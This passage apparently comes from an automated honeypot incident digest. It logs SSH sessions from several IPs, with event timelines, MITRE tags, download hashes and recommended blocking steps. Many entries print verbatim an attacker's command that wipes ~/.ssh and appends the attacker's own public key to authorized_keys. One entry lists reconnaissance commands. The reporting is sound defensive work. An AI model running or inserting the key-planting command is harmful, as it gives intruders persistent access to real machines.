| `2026-05-26 13:54:58` | `cowrie.command.input` |
| `2026-05-26 13:54:58` | `cowrie.command.failed` |
| `2026-05-26 13:54:58` | `cowrie.log.closed` |
| `2026-05-26 13:54:59` | `cowrie.session.params` |
| `2026-05-26 13:54:59` | `cowrie.command.input` |
| `2026-05-26 13:54:59` | `cowrie.session.file_download` |
| `2026-05-26 13:54:59` | `cowrie.log.closed` |
| `2026-05-26 13:55:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.142.110[.]144` to AbuseIPDB if not already reported
- [ ] Block `34.142.110[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2565b18a9cf

| Field | Detail |
|---|---|
| **Source IP** | `34.142.110[.]144` |
| **First Seen** | 2026-05-26 13:55 |
| **Last Seen** | 2026-05-26 13:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:55:02` | `cowrie.session.connect` |
| `2026-05-26 13:55:02` | `cowrie.client.version` |
| `2026-05-26 13:55:02` | `cowrie.client.kex` |
| `2026-05-26 13:55:03` | `cowrie.login.success` |
| `2026-05-26 13:55:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.142.110[.]144` to AbuseIPDB if not already reported
- [ ] Block `34.142.110[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8209b6357b6

| Field | Detail |
|---|---|
| **Source IP** | `34.142.110[.]144` |
| **First Seen** | 2026-05-26 13:57 |
| **Last Seen** | 2026-05-26 13:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:57:08` | `cowrie.session.connect` |
| `2026-05-26 13:57:08` | `cowrie.client.version` |
| `2026-05-26 13:57:08` | `cowrie.client.kex` |
| `2026-05-26 13:57:09` | `cowrie.login.success` |
| `2026-05-26 13:57:10` | `cowrie.session.params` |
| `2026-05-26 13:57:10` | `cowrie.command.input` |
| `2026-05-26 13:57:10` | `cowrie.command.failed` |
| `2026-05-26 13:57:10` | `cowrie.log.closed` |
| `2026-05-26 13:57:10` | `cowrie.session.params` |
| `2026-05-26 13:57:10` | `cowrie.command.input` |
| `2026-05-26 13:57:10` | `cowrie.session.file_download` |
| `2026-05-26 13:57:10` | `cowrie.log.closed` |
| `2026-05-26 13:57:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.142.110[.]144` to AbuseIPDB if not already reported
- [ ] Block `34.142.110[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08222b69b18a

| Field | Detail |
|---|---|
| **Source IP** | `34.142.110[.]144` |
| **First Seen** | 2026-05-26 13:57 |
| **Last Seen** | 2026-05-26 13:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:57:13` | `cowrie.session.connect` |
| `2026-05-26 13:57:13` | `cowrie.client.version` |
| `2026-05-26 13:57:14` | `cowrie.client.kex` |
| `2026-05-26 13:57:15` | `cowrie.login.success` |
| `2026-05-26 13:57:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.142.110[.]144` to AbuseIPDB if not already reported
- [ ] Block `34.142.110[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d58bcdb57ec

| Field | Detail |
|---|---|
| **Source IP** | `34.142.110[.]144` |
| **First Seen** | 2026-05-26 13:57 |
| **Last Seen** | 2026-05-26 13:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:57:41` | `cowrie.session.connect` |
| `2026-05-26 13:57:41` | `cowrie.client.version` |
| `2026-05-26 13:57:41` | `cowrie.client.kex` |
| `2026-05-26 13:57:42` | `cowrie.login.success` |
| `2026-05-26 13:57:43` | `cowrie.session.params` |
| `2026-05-26 13:57:43` | `cowrie.command.input` |
| `2026-05-26 13:57:43` | `cowrie.command.failed` |
| `2026-05-26 13:57:43` | `cowrie.log.closed` |
| `2026-05-26 13:57:44` | `cowrie.session.params` |
| `2026-05-26 13:57:44` | `cowrie.command.input` |
| `2026-05-26 13:57:44` | `cowrie.session.file_download` |
| `2026-05-26 13:57:44` | `cowrie.log.closed` |
| `2026-05-26 13:57:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.142.110[.]144` to AbuseIPDB if not already reported
- [ ] Block `34.142.110[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06bbaf790008

| Field | Detail |
|---|---|
| **Source IP** | `34.142.110[.]144` |
| **First Seen** | 2026-05-26 13:57 |
| **Last Seen** | 2026-05-26 13:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:57:47` | `cowrie.session.connect` |
| `2026-05-26 13:57:47` | `cowrie.client.version` |
| `2026-05-26 13:57:47` | `cowrie.client.kex` |
| `2026-05-26 13:57:48` | `cowrie.login.success` |
| `2026-05-26 13:57:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.142.110[.]144` to AbuseIPDB if not already reported
- [ ] Block `34.142.110[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaad2793b07b

| Field | Detail |
|---|---|
| **Source IP** | `34.142.110[.]144` |
| **First Seen** | 2026-05-26 13:58 |
| **Last Seen** | 2026-05-26 13:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:58:48` | `cowrie.session.connect` |
| `2026-05-26 13:58:48` | `cowrie.client.version` |
| `2026-05-26 13:58:48` | `cowrie.client.kex` |
| `2026-05-26 13:58:49` | `cowrie.login.success` |
| `2026-05-26 13:58:50` | `cowrie.session.params` |
| `2026-05-26 13:58:50` | `cowrie.command.input` |
| `2026-05-26 13:58:50` | `cowrie.command.failed` |
| `2026-05-26 13:58:50` | `cowrie.log.closed` |
| `2026-05-26 13:58:51` | `cowrie.session.params` |
| `2026-05-26 13:58:51` | `cowrie.command.input` |
| `2026-05-26 13:58:51` | `cowrie.session.file_download` |
| `2026-05-26 13:58:51` | `cowrie.log.closed` |
| `2026-05-26 13:58:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.142.110[.]144` to AbuseIPDB if not already reported
- [ ] Block `34.142.110[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22e553c2213e

| Field | Detail |
|---|---|
| **Source IP** | `34.142.110[.]144` |
| **First Seen** | 2026-05-26 13:58 |
| **Last Seen** | 2026-05-26 13:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:58:54` | `cowrie.session.connect` |
| `2026-05-26 13:58:54` | `cowrie.client.version` |
| `2026-05-26 13:58:54` | `cowrie.client.kex` |
| `2026-05-26 13:58:55` | `cowrie.login.success` |
| `2026-05-26 13:58:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.142.110[.]144` to AbuseIPDB if not already reported
- [ ] Block `34.142.110[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da664ab88432

| Field | Detail |
|---|---|
| **Source IP** | `125.132.34[.]65` |
| **First Seen** | 2026-05-26 13:59 |
| **Last Seen** | 2026-05-26 14:00 |
| **Session Duration** | 93s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:59:12` | `cowrie.session.connect` |
| `2026-05-26 13:59:13` | `cowrie.client.version` |
| `2026-05-26 13:59:13` | `cowrie.client.kex` |
| `2026-05-26 13:59:15` | `cowrie.login.failed` |
| `2026-05-26 13:59:16` | `cowrie.login.success` |
| `2026-05-26 13:59:17` | `cowrie.session.params` |
| `2026-05-26 13:59:17` | `cowrie.command.input` |
| `2026-05-26 13:59:17` | `cowrie.command.failed` |
| `2026-05-26 13:59:17` | `cowrie.log.closed` |
| `2026-05-26 13:59:17` | `cowrie.session.params` |
| `2026-05-26 13:59:17` | `cowrie.command.input` |
| `2026-05-26 13:59:17` | `cowrie.log.closed` |
| `2026-05-26 13:59:18` | `cowrie.session.params` |
| `2026-05-26 13:59:18` | `cowrie.command.input` |
| `2026-05-26 13:59:18` | `cowrie.log.closed` |
| `2026-05-26 13:59:18` | `cowrie.session.params` |
| `2026-05-26 13:59:18` | `cowrie.command.input` |
| `2026-05-26 13:59:18` | `cowrie.log.closed` |
| `2026-05-26 13:59:19` | `cowrie.session.params` |
| `2026-05-26 13:59:19` | `cowrie.command.input` |
| `2026-05-26 13:59:19` | `cowrie.log.closed` |
| `2026-05-26 13:59:19` | `cowrie.session.params` |
| `2026-05-26 13:59:19` | `cowrie.command.input` |
| `2026-05-26 13:59:19` | `cowrie.log.closed` |
| `2026-05-26 13:59:19` | `cowrie.session.params` |
| `2026-05-26 13:59:19` | `cowrie.command.input` |
| `2026-05-26 13:59:20` | `cowrie.log.closed` |
| `2026-05-26 13:59:20` | `cowrie.session.params` |
| `2026-05-26 13:59:20` | `cowrie.command.input` |
| `2026-05-26 13:59:20` | `cowrie.log.closed` |
| `2026-05-26 13:59:20` | `cowrie.session.params` |
| `2026-05-26 13:59:20` | `cowrie.command.input` |
| `2026-05-26 13:59:21` | `cowrie.log.closed` |
| `2026-05-26 14:00:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.132.34[.]65` to AbuseIPDB if not already reported
- [ ] Block `125.132.34[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0987d2cb4eae

| Field | Detail |
|---|---|
| **Source IP** | `34.142.110[.]144` |
| **First Seen** | 2026-05-26 13:59 |
| **Last Seen** | 2026-05-26 13:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:59:52` | `cowrie.session.connect` |
| `2026-05-26 13:59:52` | `cowrie.client.version` |
| `2026-05-26 13:59:52` | `cowrie.client.kex` |
| `2026-05-26 13:59:53` | `cowrie.login.success` |
| `2026-05-26 13:59:54` | `cowrie.session.params` |
| `2026-05-26 13:59:54` | `cowrie.command.input` |
| `2026-05-26 13:59:54` | `cowrie.command.failed` |
| `2026-05-26 13:59:54` | `cowrie.log.closed` |
| `2026-05-26 13:59:54` | `cowrie.session.params` |
| `2026-05-26 13:59:54` | `cowrie.command.input` |
| `2026-05-26 13:59:55` | `cowrie.session.file_download` |
| `2026-05-26 13:59:55` | `cowrie.log.closed` |
| `2026-05-26 13:59:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.142.110[.]144` to AbuseIPDB if not already reported
- [ ] Block `34.142.110[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abb1233758b9

| Field | Detail |
|---|---|
| **Source IP** | `34.142.110[.]144` |
| **First Seen** | 2026-05-26 13:59 |
| **Last Seen** | 2026-05-26 13:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:59:58` | `cowrie.session.connect` |
| `2026-05-26 13:59:58` | `cowrie.client.version` |
| `2026-05-26 13:59:58` | `cowrie.client.kex` |
| `2026-05-26 13:59:59` | `cowrie.login.success` |
| `2026-05-26 13:59:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.142.110[.]144` to AbuseIPDB if not already reported
- [ ] Block `34.142.110[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77b2c8c70ffd

| Field | Detail |
|---|---|
| **Source IP** | `101.96.211[.]139` |
| **First Seen** | 2026-05-26 14:32 |
| **Last Seen** | 2026-05-26 14:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 14:32:12` | `cowrie.session.connect` |
| `2026-05-26 14:32:12` | `cowrie.client.version` |
| `2026-05-26 14:32:12` | `cowrie.client.kex` |
| `2026-05-26 14:32:13` | `cowrie.login.success` |
| `2026-05-26 14:32:13` | `cowrie.session.params` |
| `2026-05-26 14:32:13` | `cowrie.command.input` |
| `2026-05-26 14:32:13` | `cowrie.command.failed` |
| `2026-05-26 14:32:13` | `cowrie.log.closed` |
| `2026-05-26 14:32:13` | `cowrie.session.params` |
| `2026-05-26 14:32:13` | `cowrie.command.input` |
| `2026-05-26 14:32:13` | `cowrie.session.file_download` |
| `2026-05-26 14:32:13` | `cowrie.log.closed` |
| `2026-05-26 14:32:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.211[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.96.211[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6e30f8fba6b

| Field | Detail |
|---|---|
| **Source IP** | `101.96.211[.]139` |
| **First Seen** | 2026-05-26 14:32 |
| **Last Seen** | 2026-05-26 14:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 14:32:15` | `cowrie.session.connect` |
| `2026-05-26 14:32:15` | `cowrie.client.version` |
| `2026-05-26 14:32:16` | `cowrie.client.kex` |
| `2026-05-26 14:32:16` | `cowrie.login.success` |
| `2026-05-26 14:32:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.211[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.96.211[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8990e403a3e

| Field | Detail |
|---|---|
| **Source IP** | `117.159.39[.]226` |
| **First Seen** | 2026-05-26 14:35 |
| **Last Seen** | 2026-05-26 14:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 14:35:48` | `cowrie.session.connect` |
| `2026-05-26 14:35:48` | `cowrie.client.version` |
| `2026-05-26 14:35:48` | `cowrie.client.kex` |
| `2026-05-26 14:35:49` | `cowrie.login.success` |
| `2026-05-26 14:35:49` | `cowrie.session.params` |
| `2026-05-26 14:35:49` | `cowrie.command.input` |
| `2026-05-26 14:35:49` | `cowrie.command.failed` |
| `2026-05-26 14:35:50` | `cowrie.log.closed` |
| `2026-05-26 14:35:50` | `cowrie.session.params` |
| `2026-05-26 14:35:50` | `cowrie.command.input` |
| `2026-05-26 14:35:50` | `cowrie.session.file_download` |
| `2026-05-26 14:35:50` | `cowrie.log.closed` |
| `2026-05-26 14:35:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.159.39[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.159.39[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afeb60ba4e58

| Field | Detail |
|---|---|
| **Source IP** | `117.159.39[.]226` |
| **First Seen** | 2026-05-26 14:35 |
| **Last Seen** | 2026-05-26 14:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 14:35:53` | `cowrie.session.connect` |
| `2026-05-26 14:35:53` | `cowrie.client.version` |
| `2026-05-26 14:35:53` | `cowrie.client.kex` |
| `2026-05-26 14:35:54` | `cowrie.login.success` |
| `2026-05-26 14:35:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.159.39[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.159.39[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b2d9d5c7485

| Field | Detail |
|---|---|
| **Source IP** | `14.103.127[.]84` |
| **First Seen** | 2026-05-26 14:41 |
| **Last Seen** | 2026-05-26 14:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 14:41:48` | `cowrie.session.connect` |
| `2026-05-26 14:41:48` | `cowrie.client.version` |
| `2026-05-26 14:41:48` | `cowrie.client.kex` |
| `2026-05-26 14:41:48` | `cowrie.login.success` |
| `2026-05-26 14:41:49` | `cowrie.session.params` |
| `2026-05-26 14:41:49` | `cowrie.command.input` |
| `2026-05-26 14:41:49` | `cowrie.command.failed` |
| `2026-05-26 14:41:49` | `cowrie.log.closed` |
| `2026-05-26 14:41:49` | `cowrie.session.params` |
| `2026-05-26 14:41:49` | `cowrie.command.input` |
| `2026-05-26 14:41:49` | `cowrie.session.file_download` |
| `2026-05-26 14:41:49` | `cowrie.log.closed` |
| `2026-05-26 14:41:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.127[.]84` to AbuseIPDB if not already reported
- [ ] Block `14.103.127[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e122f0c0611e

| Field | Detail |
|---|---|
| **Source IP** | `14.103.127[.]84` |
| **First Seen** | 2026-05-26 14:41 |
| **Last Seen** | 2026-05-26 14:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 14:41:51` | `cowrie.session.connect` |
| `2026-05-26 14:41:51` | `cowrie.client.version` |
| `2026-05-26 14:41:51` | `cowrie.client.kex` |
| `2026-05-26 14:41:52` | `cowrie.login.success` |
| `2026-05-26 14:41:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.127[.]84` to AbuseIPDB if not already reported
- [ ] Block `14.103.127[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a30362fea18c

| Field | Detail |
|---|---|
| **Source IP** | `14.103.126[.]104` |
| **First Seen** | 2026-05-26 14:46 |
| **Last Seen** | 2026-05-26 14:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
